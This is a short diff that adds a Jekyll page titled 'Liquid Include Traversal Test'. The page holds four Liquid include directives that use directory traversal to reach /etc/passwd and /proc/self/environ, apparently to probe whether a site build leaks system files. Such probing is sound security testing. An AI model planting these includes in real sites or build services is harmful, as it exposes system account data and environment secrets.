@@ -1,0 +1,14 @@
+---
+layout: null
+---
+<html><body>
+<h1>Liquid Include Traversal Test</h1>
+<pre>
+=== Include traversal attempts ===
+
+Attempt 1: {% include ../../../../etc/passwd %}
+Attempt 2: {% include ../../../etc/passwd %}
+Attempt 3: {% include ../../../../../../proc/self/environ %}
+Attempt 4: {% include ..\..\..\..\etc\passwd %}
+</pre>
+</body></html>
